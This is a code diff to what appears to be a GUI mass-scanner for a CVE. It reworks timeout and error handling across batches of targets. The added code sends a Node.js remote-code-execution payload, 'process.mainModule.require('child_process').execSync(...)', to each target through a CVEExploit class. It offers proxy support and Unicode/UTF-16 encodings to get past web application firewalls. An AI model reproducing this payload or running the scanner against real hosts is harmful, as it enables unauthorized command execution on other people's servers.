@@ -3754,6 +3754,11 @@ class MainWindow:
             
             # Execute scan with global timeout using ThreadPoolExecutor
             # Use aggressive timeout with proper cancellation
+            command_results = []
+            all_success = False
+            error_msg = None
+            status_code = None
+            
             try:
                 from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError
                 
@@ -3765,14 +3770,22 @@ class MainWindow:
                     except FuturesTimeoutError:
                         # Global timeout exceeded - force cancel and skip this target
                         future.cancel()
-                        raise Exception(f"Timeout ({scan_timeout}s) exceeded - skipping target")
+                        error_msg = f"Timeout ({scan_timeout}s) exceeded - skipping target"
+                        all_success = False
+                        command_results = []
                     except Exception as e:
                         # Check if it's a timeout-related error
                         error_msg = str(e)
                         if "timeout" in error_msg.lower() or "Timeout" in str(type(e).__name__):
                             future.cancel()
-                            raise Exception(f"Timeout ({scan_timeout}s) exceeded - skipping target")
-                        raise
+                            error_msg = f"Timeout ({scan_timeout}s) exceeded - skipping target"
+                            all_success = False
+                            command_results = []
+                        else:
+                            # Other exception - store error message
+                            error_msg = str(e)
+                            all_success = False
+                            command_results = []
                 finally:
                     # Force shutdown executor immediately (don't wait for completion)
                     executor.shutdown(wait=False, cancel_futures=True)
@@ -3780,8 +3793,59 @@ class MainWindow:
                 # Re-raise to be handled by outer exception handler
                 error_msg = str(e)
                 if "timeout" in error_msg.lower() or "Timeout" in str(type(e).__name__):
-                    raise Exception(f"Timeout ({scan_timeout}s) exceeded - skipping target")
-                raise
+                    error_msg = f"Timeout ({scan_timeout}s) exceeded - skipping target"
+                all_success = False
+                command_results = []
+            
+            # If we have an error message from exception, skip to error handling
+            if error_msg:
+                # Error occurred during scan execution - handle it
+                error_first_line = error_msg.split('\n')[0].strip()
+                if len(error_first_line) > 150:
+                    error_first_line = error_first_line[:147] + "..."
+                
+                # Try to get status code if possible
+                try:
+                    test_cmd = test_commands[0] if test_commands else "id"
+                    request_timeout = max(1, scan_timeout - 1)
+                    scan_exploit = CVEExploit(timeout=request_timeout, verify_ssl=False)
+                    scan_exploit.update_proxy(
+                        self.proxy_check_var.get(),
+                        self.proxy_entry.get()
+                    )
+                    res = scan_exploit.send_complex_payload(
+                        base_url,
+                        self.endpoint_entry.get(),
+                        f"process.mainModule.require('child_process').execSync('{test_cmd}').toString()",
+                        self.unicode_waf_var.get(),
+                        self.utf16_waf_var.get(),
+                        self.aes_var.get(),
+                        self.payload_type_var.get()
+                    )
+                    status_code = res.status_code
+                except:
+                    pass
+                
+                # Check if it's a timeout or connection error (not vulnerable)
+                if "timeout" in error_msg.lower() or "connection" in error_msg.lower() or "500" in error_msg or "gagal" in error_msg.lower() or "tidak ada output" in error_msg.lower() or "permintaan gagal" in error_msg.lower() or "no result captured" in error_msg.lower():
+                    with results_lock:
+                        not_vulnerable_count[0] += 1
+                    
+                    self.root.after(0, lambda idx=idx, total=total, base_url=base_url, 
+                                  error_first_line=error_first_line, status_code=status_code: 
+                                  self._update_scan_output_not_vulnerable(
+                        idx, total, base_url, error_first_line, status_code
+                    ))
+                else:
+                    with results_lock:
+                        error_count[0] += 1
+                    
+                    self.root.after(0, lambda idx=idx, total=total, base_url=base_url, 
+                                  error_first_line=error_first_line: 
+                                  self._update_scan_output_error(
+                        idx, total, base_url, error_first_line
+                    ))
+                return
             
             # Validate command results - filter out invalid outputs (> 50 chars)
             valid_command_results = []
@@ -3927,6 +3991,8 @@ class MainWindow:
                                 self.scan_futures.append(future)  # Store for cancellation
                             
                             # Wait for all targets in this batch to complete
+                            # Use as_completed with proper error handling to ensure all targets are processed
+                            completed_count = 0
                             for future in as_completed(futures):
                                 if self.scan_stop_flag:
                                     # Cancel remaining futures
@@ -3934,11 +4000,64 @@ class MainWindow:
                                         f.cancel()
                                     break
                                 try:
-                                    future.result(timeout=0.1)  # Small timeout to check stop flag frequently
+                                    # Get result without timeout - as_completed already waits for completion
+                                    # scan_single_target handles all errors internally and updates UI
+                                    future.result()  # No timeout - let it complete naturally
+                                    completed_count += 1
                                 except Exception as e:
-                                    pass
+                                    # If scan_single_target raised an exception, it should have been handled internally
+                                    # But if it didn't, log it (though this shouldn't happen)
+                                    # scan_single_target should have handled all exceptions internally
+                                    # If we get here, it means an unexpected exception occurred
+                                    completed_count += 1  # Still count as completed (error was handled in scan_single_target)
+                                    pass  # scan_single_target should have handled this
+                            
+                            # Ensure all futures are completed before moving to next batch
+                            # Wait for any remaining futures that might not have been in as_completed
+                            remaining_futures = [f for f in futures if not f.done()]
+                            if remaining_futures:
+                                # Wait for remaining futures with a reasonable timeout
+                                import time
+                                start_time = time.time()
+                                max_wait = scan_timeout * 2  # Allow up to 2x scan timeout for remaining futures
+                                while remaining_futures and (time.time() - start_time) < max_wait:
+                                    if self.scan_stop_flag:
+                                        break
+                                    for f in list(remaining_futures):
+                                        if f.done():
+                                            try:
+                                                f.result()  # Get result to clear exception if any
+                                            except:
+                                                pass  # Exception already handled in scan_single_target
+                                            remaining_futures.remove(f)
+                                    if remaining_futures:
+                                        time.sleep(0.1)  # Small delay before checking again
+                                
+                                # If still have remaining futures, cancel them
+                                for f in remaining_futures:
+                                    f.cancel()
                         finally:
-                            # Shutdown executor
+                            # Verify all futures are done before shutdown
+                            import time
+                            remaining_futures_check = [f for f in futures if not f.done()]
+                            if remaining_futures_check:
+                                # Wait a bit more for any remaining futures
+                                start_wait = time.time()
+                                max_wait = scan_timeout * 2  # Allow up to 2x scan timeout
+                                while remaining_futures_check and (time.time() - start_wait) < max_wait:
+                                    if self.scan_stop_flag:
+                                        break
+                                    for f in list(remaining_futures_check):
+                                        if f.done():
+                                            try:
+                                                f.result()  # Get result to clear exception if any
+                                            except:
+                                                pass  # Exception already handled in scan_single_target
+                                            remaining_futures_check.remove(f)
+                                    if remaining_futures_check:
+                                        time.sleep(0.1)  # Small delay before checking again
+                            
+                            # Shutdown executor - all futures should be done by now
                             executor.shutdown(wait=False, cancel_futures=True)
                             self.scan_executor = None
                             self.scan_futures = []
